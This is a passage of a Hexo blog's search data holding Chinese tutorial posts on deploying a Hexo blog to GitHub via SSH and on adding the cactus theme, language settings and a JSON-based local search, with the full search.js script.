s  #相当于 启动服务 hexo server</span><br></pre></td></tr></table></figure>\n<p>感觉效果满意就可以部署到GitHub上了</p>\n<p>在hexo目录下，打开git bash，输入以下命令，清除缓存，将内容部署到GitHub</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">#推送到gitee</span><br><span class=\"line\">hexo g -d</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"将博客部署到Github上\"><a href=\"#将博客部署到Github上\" class=\"headerlink\" title=\"将博客部署到Github上\"></a>将博客部署到Github上</h2><h3 id=\"新建仓库\"><a href=\"#新建仓库\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>登录我们的 github，新建一个仓库</p>\n<p><img src=\"0v2bqa22w3g6HeZccv32X_u7LXW_n0i0sCddPazNlvM.png\" alt=\"image\"></p>\n<h3 id=\"创建SSH-key\"><a href=\"#创建SSH-key\" class=\"headerlink\" title=\"创建SSH key\"></a>创建SSH key</h3><p>首先要重新在git设置一下身份的名字和邮箱；删除.ssh文件夹</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;username&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;xxxxxx@163.com&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在 git bash here 中创建一个ssh密钥</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">指令：<span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;邮箱&quot;</span>  <span class=\"comment\">#此处邮箱填写自己的邮箱</span></span><br></pre></td></tr></table></figure>\n<p>然后enter三连</p>\n<p>生成两个文件： id_rsa和id_rsa.pub 存放在文件夹下(window在：C:\\Users\\admin.ssh)</p>\n<p><img src=\"wnQoPpO2kycVmCJhdEhht-SCiEBHi0WEiEbE0hHJPG4.png\" alt=\"image\"></p>\n<p>在GitHub的设置里面创建一个ssh密钥.</p>\n<ul>\n<li>Title：随意填写</li>\n<li>Key：将本地的id_rsa.pub文件用记事本打开，复制全部内容粘贴到GitHub仓库的SSH Keys 位置</li>\n</ul>\n<p><img src=\"V9Kd_L68wDccwrfOZyOQGryDAxrpggeIdN0wzYcBvDw.png\" alt=\"image\"></p>\n<p>添加成功</p>\n<p><img src=\"bCEtDFcgCvXHlAAPry1CFOVdrRKABpYF43exvckkHo0.png\" alt=\"image\"></p>\n<h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 这里需要先安装deployer-git插件</span><br><span class=\"line\">sudo npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"Pog-PLHcf3Aq0PF995VZXKmcj-TG232MclF1K0vCKXA.png\" alt=\"image\"></p>\n<p>安装完成 git 部署插件后，需要设置下 blogs文件夹下的 _config.yml 这个文件</p>\n<p>修改文件的 Deployment 部分,</p>\n<p>安装完成上述的deployer-git插件之后，设置项目文件夹下的_config.yml 文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: https:<span class=\"comment\">//github.com/Garckz/Garckz.github.io</span></span><br><span class=\"line\">  branch: master</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">新版本写法：</span><br><span class=\"line\">branch需要使用mian</span><br><span class=\"line\"></span><br><span class=\"line\">SSH写法：</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: git<span class=\"meta\">@github</span>.com:Garckz/Garckz.github.io.git</span><br><span class=\"line\">  branch: main</span><br></pre></td></tr></table></figure>\n<p><img src=\"LrR_MSFKobBTeJlV3KL918TSypDaSe0lAUh77Y-vgp0.png\" alt=\"image\"></p>\n<p><strong>切记：分支branch切记修改为 main，之前github的默认主分支为master，现已经改为main</strong> ！！！</p>\n<h3 id=\"上传到Github\"><a href=\"#上传到Github\" class=\"headerlink\" title=\"上传到Github\"></a>上传到Github</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 清理</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\"># 构建静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 上传到仓库</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n<p><img src=\"nMpLWIMDazitLVGFeolbJPbfyNlO3_uxV6_A17cZKPY.png\" alt=\"image\"></p>\n<h2 id=\"将博客部署到Gitee上\"><a href=\"#将博客部署到Gitee上\" class=\"headerlink\" title=\"将博客部署到Gitee上\"></a>将博客部署到Gitee上</h2><h3 id=\"新建仓库-1\"><a href=\"#新建仓库-1\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>在Gitee上新建一个用来存放博客的仓库，此处需要特别注意路径的填写。</p>\n<p><img src=\"KHyjTbtqtZOVzQr1e2aluRYqGRh9hawoLDSAwG7YmQ0.png\" alt=\"image\"></p>\n<p>需要实名验证，所以就不用这个做了，很麻烦。</p>\n","categories":["Hexo"],"tags":["Hexo","环境搭建"]},{"title":"搭建Hexo博客进阶","url":"/2020/02/29/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/","content":"<h1 id=\"搭建Hexo博客进阶\"><a href=\"#搭建Hexo博客进阶\" class=\"headerlink\" title=\"搭建Hexo博客进阶\"></a>搭建Hexo博客进阶</h1><h2 id=\"更换模板\"><a href=\"#更换模板\" class=\"headerlink\" title=\"更换模板\"></a>更换模板</h2><p>到themes目录下，下载自己喜欢主题模板</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/probberechts/hexo-theme-cactus.git</span><br></pre></td></tr></table></figure>\n<p>在项目的_config.yml文件中进行更换主题</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">theme: hexo-theme-cactus</span><br></pre></td></tr></table></figure>\n<p>在项目目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  <span class=\"comment\">#相当于 启动服务 hexo server</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"新建一个导航栏的项\"><a href=\"#新建一个导航栏的项\" class=\"headerlink\" title=\"新建一个导航栏的项\"></a>新建一个导航栏的项</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav</p>\n<p><img src=\"C-a5CXYmE9OHOUAtBMIgp_FvbBJmTlQW6DqHBr2Sf7o.png\" alt=\"image\"></p>\n<p><img src=\"Nb5nWx1QkeQdj5eanykeR44MqMoc4Mp-Zr4Skuk_I7A.png\" alt=\"image\"></p>\n<h2 id=\"更换语言类型\"><a href=\"#更换语言类型\" class=\"headerlink\" title=\"更换语言类型\"></a>更换语言类型</h2><p>更换项目的_config.yml 为下面的内容即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\">title: 兀自</span><br><span class=\"line\">subtitle: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">description: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">keywords:</span><br><span class=\"line\">author: Garckz</span><br><span class=\"line\">language: zh-CN</span><br><span class=\"line\">timezone: <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"修改欢迎页面的内容\"><a href=\"#修改欢迎页面的内容\" class=\"headerlink\" title=\"修改欢迎页面的内容\"></a>修改欢迎页面的内容</h2><p>先查看你language用的语言模板，这里是：zh-CN</p>\n<p>所以修改主题文件夹下面的language文件下面的zh-CN.yml文件的内容即可。</p>\n<h2 id=\"添加搜索-XML\"><a href=\"#添加搜索-XML\" class=\"headerlink\" title=\"添加搜索(XML)\"></a>添加搜索(XML)</h2><p>先在在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav添加一个标签。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br><span class=\"line\">  articles: /archives/</span><br><span class=\"line\">  projects: http://github.com/probberechts</span><br><span class=\"line\">  search: /search/</span><br></pre></td></tr></table></figure>\n<p>用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\" title=\"hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"A_G15Imlu2VdAlS_XN-XiIyTocPIenmtwXRqJwje_pM.png\" alt=\"image\"></p>\n<p>执行下面命令创建一个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page search</span><br></pre></td></tr></table></figure>\n<p>进入项目地址下的source&#x2F;search&#x2F;index.md，修改md文件的头为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Search</span><br><span class=\"line\"><span class=\"built_in\">type</span>: search</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p><img src=\"uP6XsJwwD34izTmKUtWbOB8jrWpXSv00OmjGd2f6a6Y.png\" alt=\"image\"></p>\n<p>出现页面之后，搜索到的内容不可以超链接点过去访问，这时候需要进行以下的配置。</p>\n<p><strong>配置1</strong></p>\n<p>在项目下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Search</span></span><br><span class=\"line\"><span class=\"attr\">search:</span></span><br><span class=\"line\">  <span class=\"attr\">path:</span> <span class=\"string\">search.xml</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">post</span></span><br><span class=\"line\">  <span class=\"attr\">content:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">format:</span> <span class=\"string\">html</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"KUhFEBqwSuss11_P-eGBshQhrbDC2W5_BWp0MMtB65I.png\" alt=\"image\"></p>\n<ul>\n<li><p>path：表示搜索后生成的文件路径，可以生成xml和json两种格式。</p>\n</li>\n<li><p>field：表示搜索的范围，有“​​post、page和all​​”三种值。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">post：所有的文章；</span><br><span class=\"line\">page：所有顶部导航选项的页面；</span><br><span class=\"line\">all：所有的文章和顶部导航选项的页面。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>content：是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</li>\n<li>format：搜索到的内容、选项的格式。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">html(默认)：将html原文本缩略。</span><br><span class=\"line\">striptags：将html原文本缩略，并删除所有标记。</span><br><span class=\"line\">raw：记下每一篇文章或每一页的文字。</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>配置2</strong></p>\n<p>主题文件下_config.yml文件添加下面的内容</p>\n<p> all：所有的文章和顶部导航选项的页面。</p>\n<p><img src=\"DrgbW9P7qj4biCTE_A4c6ObM-l6QlTw4E_tkh3PLgMI.png\" alt=\"image\"></p>\n<h2 id=\"添加搜索（JSON）\"><a href=\"#添加搜索（JSON）\" class=\"headerlink\" title=\"添加搜索（JSON）\"></a>添加搜索（JSON）</h2><p>上面我们使用.xml的方式做搜索。偶时候链接错误，出现undefined。</p>\n<p>网上的说法是：某些文章有格式问题，导致生成的search.xml也出错了。</p>\n<p>下面我们使用json格式的方式来实现该功能。</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>在项目的_config.yml文件中把search.xml修改为search.json</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml</span><br><span class=\"line\">  field: post</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br></pre></td></tr></table></figure>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>找到主题的search.ejs模板文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;search.ejs</p>\n<p>我这里的这个主题不需要修改。其它主题的修改方式：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.xml&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>修改为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.json&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>修改你的search的本地js文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;source&#x2F;js&#x2F;search.js</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">还需要注释掉：</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">// A <span class=\"built_in\">local</span> search script with the <span class=\"built_in\">help</span> of</span><br><span class=\"line\">// [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)</span><br><span class=\"line\">// Copyright (C) 2015</span><br><span class=\"line\">// Joseph Pan &lt;http://github.com/wzpan&gt;</span><br><span class=\"line\">// Shuhao Mao &lt;http://github.com/maoshuhao&gt;</span><br><span class=\"line\">// This library is free software; you can redistribute it and/or modify</span><br><span class=\"line\">// it under the terms of the GNU Lesser General Public License as</span><br><span class=\"line\">// published by the Free Software Foundation; either version 2.1 of the</span><br><span class=\"line\">// License, or (at your option) any later version.</span><br><span class=\"line\">//</span><br><span class=\"line\">// This library is distributed <span class=\"keyword\">in</span> the hope that it will be useful, but</span><br><span class=\"line\">// WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class=\"line\">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span><br><span class=\"line\">// Lesser General Public License <span class=\"keyword\">for</span> more details.</span><br><span class=\"line\">//</span><br><span class=\"line\">// You should have received a copy of the GNU Lesser General Public</span><br><span class=\"line\">// License along with this library; <span class=\"keyword\">if</span> not, write to the Free Software</span><br><span class=\"line\">// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA</span><br><span class=\"line\">// 02110-1301 USA</span><br><span class=\"line\">//</span><br><span class=\"line\">// Modified by:</span><br><span class=\"line\">// Pieter Robberechts &lt;http://github.com/probberechts&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/*exported searchFunc*/</span><br><span class=\"line\">var searchFunc = <span class=\"keyword\">function</span>(path, searchId, contentId) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> stripHtml(html) &#123;</span><br><span class=\"line\">    html = html.replace(/&lt;style([\\s\\S]*?)&lt;\\/style&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;script([\\s\\S]*?)&lt;\\/script&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;figure([\\s\\S]*?)&lt;\\/figure&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/div&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/li&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;li&gt;/ig, <span class=\"string\">&quot;  *  &quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/ul&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/p&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;br\\s*[\\/]?&gt;/gi, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;[^&gt;]+&gt;/ig, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> html;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> getAllCombinations(keywords) &#123;</span><br><span class=\"line\">    var i, j, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = 0; i &lt; keywords.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = i + 1; j &lt; keywords.length + 1; j++) &#123;</span><br><span class=\"line\">            result.push(keywords.slice(i, j).<span class=\"built_in\">join</span>(<span class=\"string\">&quot; &quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  $.ajax(&#123;</span><br><span class=\"line\">    url: path,</span><br><span class=\"line\">    // dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    //success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br><span class=\"line\"></span><br><span class=\"line\">      var <span class=\"variable\">$input</span> = document.getElementById(searchId);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"variable\">$input</span>) &#123; <span class=\"built_in\">return</span>; &#125;</span><br><span class=\"line\">      var <span class=\"variable\">$resultContent</span> = document.getElementById(contentId);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable\">$input</span>.addEventListener(<span class=\"string\">&quot;input&quot;</span>, <span class=\"function\"><span class=\"title\">function</span></span>()&#123;</span><br><span class=\"line\">        var resultList = [];</span><br><span class=\"line\">        var keywords = getAllCombinations(this.value.trim().toLowerCase().<span class=\"built_in\">split</span>(<span class=\"string\">&quot; &quot;</span>))</span><br><span class=\"line\">          .<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a,b) &#123; <span class=\"built_in\">return</span> b.split(<span class=\"string\">&quot; &quot;</span>).length - a.split(<span class=\"string\">&quot; &quot;</span>).length; &#125;);</span><br><span class=\"line\">        <span class=\"variable\">$resultContent</span>.innerHTML = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (this.value.trim().length &lt;= 0) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // perform <span class=\"built_in\">local</span> searching</span><br><span class=\"line\">        datas.forEach(<span class=\"keyword\">function</span>(data) &#123;</span><br><span class=\"line\">          var matches = 0;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!data.title || data.title.trim() === <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            data.title = <span class=\"string\">&quot;Untitled&quot;</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          var dataTitle = data.title.trim().toLowerCase();</span><br><span class=\"line\">          var dataTitleLowerCase = dataTitle.toLowerCase();</span><br><span class=\"line\">          var dataContent = stripHtml(data.content.trim());</span><br><span class=\"line\">          var dataContentLowerCase = dataContent.toLowerCase();</span><br><span class=\"line\">          var dataUrl = data.url;</span><br><span class=\"line\">          var indexTitle = -1;</span><br><span class=\"line\">          var indexContent = -1;</span><br><span class=\"line\">          var firstOccur = -1;</span><br><span class=\"line\">          // only match artiles with not empty contents</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (dataContent !== <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            keywords.forEach(<span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">              indexTitle = dataTitleLowerCase.indexOf(keyword);</span><br><span class=\"line\">              indexContent = dataContentLowerCase.indexOf(keyword);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>( indexTitle &gt;= 0 || indexContent &gt;= 0 )&#123;</span><br><span class=\"line\">                matches += 1;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (indexContent &lt; 0) &#123;</span><br><span class=\"line\">                  indexContent = 0;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (firstOccur &lt; 0) &#123;</span><br><span class=\"line\">                  firstOccur = indexContent;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          // show search results</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (matches &gt; 0) &#123;</span><br><span class=\"line\">            var searchResult = &#123;&#125;;</span><br><span class=\"line\">            searchResult.rank = matches;</span><br><span class=\"line\">            searchResult.str = <span class=\"string\">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span>+ dataUrl +<span class=\"string\">&quot;&#x27; class=&#x27;search-result-title&#x27;&gt;&quot;</span>+ dataTitle +<span class=\"string\">&quot;&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (firstOccur &gt;= 0) &#123;</span><br><span class=\"line\">              // <span class=\"built_in\">cut</span> out 100 characters</span><br><span class=\"line\">              var start = firstOccur - 20;</span><br><span class=\"line\">              var end = firstOccur + 80;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start &lt; 0)&#123;</span><br><span class=\"line\">                start = 0;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start == 0)&#123;</span><br><span class=\"line\">                end = 100;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(end &gt; dataContent.length)&#123;</span><br><span class=\"line\">                end = dataContent.length;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              var matchContent = dataContent.substring(start, end);</span><br><span class=\"line\"></span><br><span class=\"line\">              // highlight all keywords</span><br><span class=\"line\">              var regS = new RegExp(keywords.join(<span class=\"string\">&quot;|&quot;</span>), <span class=\"string\">&quot;gi&quot;</span>);</span><br><span class=\"line\">              matchContent = matchContent.replace(regS, <span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"string\">&quot;&lt;em class=\\&quot;search-keyword\\&quot;&gt;&quot;</span>+keyword+<span class=\"string\">&quot;&lt;/em&gt;&quot;</span>;</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">              searchResult.str += <span class=\"string\">&quot;&lt;p class=\\&quot;search-result\\&quot;&gt;&quot;</span> + matchContent +<span class=\"string\">&quot;...&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            searchResult.str += <span class=\"string\">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">            resultList.push(searchResult);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (resultList.length) &#123;</span><br><span class=\"line\">          resultList.<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a, b) &#123;</span><br><span class=\"line\">              <span class=\"built_in\">return</span> b.rank - a.rank;</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          var result =<span class=\"string\">&quot;&lt;ul class=\\&quot;search-result-list\\&quot;&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (var i = 0; i &lt; resultList.length; i++) &#123;</span><br><span class=\"line\">            result += resultList[i].str;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          result += <span class=\"string\">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"variable\">$resultContent</span>.innerHTML = result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>最终项目的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  content: <span class=\"literal\">true</span></span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n<p>最终主题的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># auto表示改变输入就自动触发搜索</span></span><br><span class=\"line\">  <span class=\"comment\"># manual表示按下回车键或搜索按钮才触发搜索</span></span><br><span class=\"line\">  trigger: auto</span><br><span class=\"line\">  <span class=\"comment\"># 这里的数字n表示显示每篇文章搜索到的n个结果</span></span><br><span class=\"line\">  <span class=\"comment\"># -1表示显示每篇文章搜索到的全部结果(不建议)</span></span><br><span class=\"line\">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加标签页\"><a href=\"#添加标签页\" class=\"headerlink\" title=\"添加标签页\"></a>添加标签页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page 